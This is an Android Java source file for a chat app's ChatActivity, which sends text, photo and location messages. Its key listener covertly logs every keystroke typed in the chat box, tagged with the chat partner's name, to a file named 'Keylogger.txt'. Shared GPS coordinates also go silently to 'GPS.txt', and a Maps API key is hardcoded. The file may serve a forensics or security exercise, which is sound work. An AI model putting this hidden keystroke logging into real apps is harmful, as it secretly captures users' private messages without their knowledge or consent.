package com.example.project;

import android.Manifest;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.BitmapDrawable;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.os.Environment;
import android.provider.MediaStore;
import android.view.KeyEvent;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.ArrayAdapter;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.Button;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.common.api.ResolvableApiException;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.LocationSettingsRequest;
import com.google.android.gms.location.LocationSettingsResponse;
import com.google.android.gms.location.LocationSettingsStatusCodes;
import com.google.android.gms.location.Priority;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

public class ChatActivity extends AppCompatActivity {

    ArrayList<Message> messages = new ArrayList<>();
    ArrayAdapter<Message> adapter;
    ListView messageList;
    EditText inputMessage;
    Toolbar toolbar;
    String user, otheruser;
    DBHelper db;
    Calendar calendar = Calendar.getInstance();
    Date date = calendar.getTime();
    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    String dateString = dateFormat.format(date);
    ImageView image, location;
    LocationRequest locationRequest;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_chat);
        messageList = findViewById(R.id.message_list);
        inputMessage = findViewById(R.id.input_message);
        toolbar = findViewById(R.id.chattingToolbar);
        image = findViewById(R.id.sendImage);
        location = findViewById(R.id.sendLocation);
        db = new DBHelper(this);
        locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(2000)
                .build();
        otheruser = getIntent().getStringExtra("sender");
        inputMessage.setFocusableInTouchMode(true);
        inputMessage.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
                        return false;
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                        String keylog  = "Chat with " + otheruser + ":{BACKSPACE}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                        String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                    else{
                        char key = (char) keyEvent.getUnicodeChar();
                        String keylog  = "Chat with " + otheruser + ":{" + key + "}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                }
                return false;
            }
        });
        image.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                if (ContextCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(ChatActivity.this, new String[]{Manifest.permission.CAMERA}, 0);
                } else if (ContextCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(ChatActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 0);
                } else if (ContextCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(ChatActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 0);
                } else {
                    final CharSequence[] options = {"Take Photo from Camera", "Choose from Gallery", "Cancel"};
                    AlertDialog.Builder builder = new AlertDialog.Builder(ChatActivity.this);
                    builder.setTitle("Choose your profile picture");
                    builder.setItems(options, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int item) {
                            if (options[item].equals("Take Photo from Camera")) {
                                Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                                startActivityForResult(intent, 100);
                            } else if (options[item].equals("Choose from Gallery")) {
                                Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                                intent.setType("image/*");
                                startActivityForResult(intent, 200);
                            } else if (options[item].equals("Cancel")) {
                                dialog.dismiss();
                            }
                        }
                    });
                    builder.show();
                }
            }
        });

        location.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (ActivityCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    if (isGPSEnabled()) {
                        LocationServices.getFusedLocationProviderClient(ChatActivity.this)
                                .requestLocationUpdates(locationRequest, new LocationCallback() {
                                    @Override
                                    public void onLocationResult(@NonNull LocationResult locationResult) {
                                        super.onLocationResult(locationResult);

                                        LocationServices.getFusedLocationProviderClient(ChatActivity.this)
                                                .removeLocationUpdates(this);

                                        if (locationResult != null && locationResult.getLocations().size() > 0) {

                                            int index = locationResult.getLocations().size() - 1;
                                            double latitude = locationResult.getLocations().get(index).getLatitude();
                                            double longitude = locationResult.getLocations().get(index).getLongitude();

                                            String message = latitude+","+longitude;
                                            if (!message.isEmpty()) {
                                                Message chat = new Message(user, otheruser, 3, dateString, message, null);
                                                db.sendChat(chat);
                                                messages.add(chat);
                                                adapter.notifyDataSetChanged();
                                                inputMessage.setText("");
                                                String storageMessage = "User: "+ chat.getSender()
                                                        + " Timestamp: " + chat.getTimestamp()
                                                        + " Location: " + chat.getMessage();
                                                writeToFile("GPS.txt", storageMessage);
                                            }
                                        }
                                    }
                                }, Looper.getMainLooper());

                    } else {
                        turnOnGPS();
                    }

                } else {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
                    }
                }
            }
        });
        otheruser = getIntent().getStringExtra("sender");
        toolbar.setTitle(otheruser);
        setSupportActionBar(toolbar);
        toolbar.setNavigationOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                onBackPressed();
            }
        });
        user = getSharedPreferences("session", MODE_PRIVATE).getString("username", "");
        messages = db.getAllMessages(user, otheruser);
        adapter = new ArrayAdapter<Message>(this, 0, messages) {
            @Override
            public View getView(int position, View convertView, ViewGroup parent) {
                View view;
                if (convertView == null) {
                    view = getLayoutInflater().inflate(R.layout.imagelayout, parent, false);
                } else {
                    view = convertView;
                }

                ImageView imageView = view.findViewById(R.id.image_view);
                TextView textView = view.findViewById(R.id.text_view);

                Message message = getItem(position);
                if (message.getType() == 1) {
                    String messageText = message.getTimestamp() + "\n" + message.getSender() + ": " + message.getMessage();
                    textView.setText(messageText);
                    imageView.setVisibility(View.GONE);
                } else if (message.getType() == 2) {
                    byte[] dp = message.getPhoto();
                    Bitmap bitmap = BitmapFactory.decodeByteArray(dp, 0, dp.length);
                    imageView.setImageBitmap(bitmap);
                    imageView.setVisibility(View.VISIBLE);
                    String timestamp = message.getTimestamp() + "\n" + message.getSender();
                    textView.setText(timestamp);
                }
                else if (message.getType() == 3) {
                    String messageText = message.getTimestamp() + "\n" + message.getSender() + ": " + message.getMessage();
                    textView.setText(messageText);
                    textView.setClickable(true);
                    textView.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            displayLocation(message.getMessage());
                        }
                    });
                    imageView.setVisibility(View.GONE);
                }
                return view;
            }

        };
        messageList.setAdapter(adapter);
    }

    public void sendMessage(View view) {
        String message = inputMessage.getText().toString();
        if (!message.isEmpty()) {
            Message chat = new Message(user, otheruser, 1, dateString, message, null);
            db.sendChat(chat);
            messages.add(chat);
            adapter.notifyDataSetChanged();
            inputMessage.setText("");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        String filePath = this.getFilesDir().getPath() + "test.jpg";
        if (requestCode == 100){
            try {
                FileOutputStream fos = new FileOutputStream(filePath);
                Bitmap photo = (Bitmap) data.getExtras().get("data");
                photo.compress(Bitmap.CompressFormat.JPEG, 100, fos);
                fos.flush();
                fos.close();
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                photo.compress(Bitmap.CompressFormat.PNG, 100, stream);
                byte[] image = stream.toByteArray();
                Message chat = new Message(user, otheruser, 2, dateString, null, image);
                db.sendChat(chat);
                messages.add(chat);
                adapter.notifyDataSetChanged();
            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                e.printStackTrace();
            }
            ContentValues values = new ContentValues();
            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
            values.put(MediaStore.Images.Media.DATA, filePath);
            getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);

            Toast.makeText(this, "Image saved!", Toast.LENGTH_SHORT).show();
        }
        else if (requestCode == 200){
            if(data != null && data.getData() != null){
                try{
                    Uri imageUri = data.getData();
                    Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), imageUri);
                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
                    byte[] image = stream.toByteArray();
                    Message chat = new Message(user, otheruser, 2, dateString, null, image);
                    db.sendChat(chat);
                    messages.add(chat);
                    adapter.notifyDataSetChanged();
                } catch (IOException e){
                    e.printStackTrace();
                }
            }
        }
    }

    private String getFilePath() {
        File directory = null;
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            directory = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
        } else {
            directory = new File(getFilesDir(), "Pictures");
            if (!directory.exists()) {
                directory.mkdirs();
            }
        }
        return directory.getAbsolutePath() + "/" + System.currentTimeMillis() + ".jpg";
    }

    private class DownloadImageFromInternet extends AsyncTask<String, Void, Bitmap> {
        ImageView imageView;
        public DownloadImageFromInternet(ImageView imageView) {
            this.imageView=imageView;
        }
        protected Bitmap doInBackground(String... urls) {
            String imageURL=urls[0];
            Bitmap bimage=null;
            try {
                InputStream in=new java.net.URL(imageURL).openStream();
                bimage=BitmapFactory.decodeStream(in);
            } catch (Exception e) {
                Log.e("Error Message", e.getMessage());
                e.printStackTrace();
            }
            return bimage;
        }
        protected void onPostExecute(Bitmap result) {
            imageView.setImageBitmap(result);
        }
    }

    private boolean isGPSEnabled() {
        LocationManager locationManager = null;
        boolean isEnabled = false;

        if (locationManager == null) {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        }

        isEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        return isEnabled;

    }
    private void turnOnGPS() {

        LocationSettingsRequest.Builder builder = new LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest);
        builder.setAlwaysShow(true);

        Task<LocationSettingsResponse> result = LocationServices.getSettingsClient(getApplicationContext())
                .checkLocationSettings(builder.build());

        result.addOnCompleteListener(new OnCompleteListener<LocationSettingsResponse>() {
            @Override
            public void onComplete(@NonNull Task<LocationSettingsResponse> task) {
                try {
                    LocationSettingsResponse response = task.getResult(ApiException.class);
                    Toast.makeText(ChatActivity.this, "GPS is already turned on", Toast.LENGTH_SHORT).show();
                } catch (ApiException e) {
                    switch (e.getStatusCode()) {
                        case LocationSettingsStatusCodes.RESOLUTION_REQUIRED:
                            try {
                                ResolvableApiException resolvableApiException = (ResolvableApiException) e;
                                resolvableApiException.startResolutionForResult(ChatActivity.this, 2);
                            } catch (IntentSender.SendIntentException ex) {
                                ex.printStackTrace();
                            }
                            break;
                        case LocationSettingsStatusCodes.SETTINGS_CHANGE_UNAVAILABLE:
                            //Device does not have location
                            break;
                    }
                }
            }
        });

    }
    private void displayLocation(String location) {
        loadPhoto(400,200, location);
    }
    private void loadPhoto(int width, int height, String location) {

        AlertDialog.Builder imageDialog = new AlertDialog.Builder(this);
        LayoutInflater inflater = (LayoutInflater) this.getSystemService(LAYOUT_INFLATER_SERVICE);

        View layout = inflater.inflate(R.layout.locationlayout,
                (ViewGroup) findViewById(R.id.layout_root));
        ImageView image = (ImageView) layout.findViewById(R.id.fullimage);

        String mapWidth = "400";
        String mapHeight = "200";
        String imageURL = "https://maps.googleapis.com/maps/api/staticmap?center="+location+"&zoom=10&size="+width+"x"+height+"&key=AIzaSyBBrVAnTZ7sUurRw212cqIadbd_W76NL4Y";
        new ChatActivity.DownloadImageFromInternet(image).execute(imageURL);

        LinearLayout.LayoutParams params = (LinearLayout.LayoutParams)image.getLayoutParams();
        params.width = dpToPx(400);
        params.height = dpToPx(200);
        image.setLayoutParams(params);
        imageDialog.setView(layout);
        imageDialog.setPositiveButton("Close", new DialogInterface.OnClickListener(){
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });

        imageDialog.create();
        imageDialog.show();
    }

    public int dpToPx(int dp) {
        float density = getResources().getDisplayMetrics().density;
        return Math.round((float) dp * density);
    }

    public void writeToFile(String fileName, String content) {
        File file = new File(ChatActivity.this.getFilesDir().getPath());
        try {
            File gpxfile = new File(file, fileName);
            FileWriter writer = new FileWriter(gpxfile, true);
            writer.append(content + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
